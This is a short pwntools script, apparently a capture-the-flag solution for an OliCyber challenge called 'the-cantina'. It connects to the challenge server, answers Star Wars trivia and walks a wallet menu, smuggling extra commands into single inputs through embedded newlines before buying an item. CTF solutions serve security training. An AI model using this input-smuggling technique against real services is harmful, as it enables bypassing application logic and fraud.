from pwn import remote

r = remote("the-cantina.challs.olicyber.it", 38083)

r.sendlineafter(b">", b"select_coin\nOLI")
r.sendlineafter(b">", b"select_wallet\n0xBABE")
r.sendlineafter(b">", b"authenticate")
r.sendlineafter(b"primo?", b"Han")
r.sendlineafter(b"Luke?", b"Vader")
r.sendlineafter(b"Wookiee?", b"Kashyyyk")
r.sendlineafter(b">", b"topup_wallet")
r.sendlineafter(b">", b"buy_drink\nDarksaber Distillate")
r.interactive()
